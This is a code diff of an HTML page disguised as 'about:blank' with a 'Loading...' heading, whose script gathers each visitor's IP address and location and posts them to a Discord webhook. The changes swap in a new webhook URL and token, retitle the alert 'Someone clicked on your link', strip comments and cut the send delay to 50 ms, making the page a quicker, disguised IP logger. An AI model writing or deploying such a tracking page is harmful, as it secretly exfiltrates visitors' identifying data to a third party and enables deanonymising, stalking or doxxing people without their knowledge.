@@ -4,11 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>about:blank</title>
+	<h1>Loading...<h1>
 </head>
 <body>
     <script>
         (function() {
-            var webhookURL = 'https://discord.com/api/webhooks/1271140870632112271/GFyCZAWmycvwoAGev1_dy7R_UHhiIKoeWCp9S1_dBJthHmS04ffDrWZ3R3rRHfFJ_Ich';
+            var webhookURL = 'https://discord.com/api/webhooks/1271141178246561823/mNmpYeFUk3PsLEpvHgG7elgFHKD_nPJJrHUrF5ylPhTyDoMfKornNgF6iBgqwOBgFp0w';
 
             // Function to get IP and location details
             async function fetchIPInfo() {
@@ -49,7 +50,7 @@
                 ` : 'Failed to retrieve data';
 
                 const embed = {
-                    title: 'Visitor Information',
+                    title: '`Someone clicked on your link`',
                     description: description,
                     color: 0x00FF00,
                     footer: {
@@ -91,8 +92,8 @@
                 };
 
                 const payload = JSON.stringify({ embeds: [embed] });
-
-                // Use the fetch API to send the data to the webhook URL
+				
+				
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: {
@@ -101,11 +102,10 @@
                     body: payload
                 });
             }
-
-            // Delay sending data by 1 second
+            
             setTimeout(() => {
                 sendEmbed();
-            }, 1000);
+            }, 50);
         })();
     </script>
 </body>
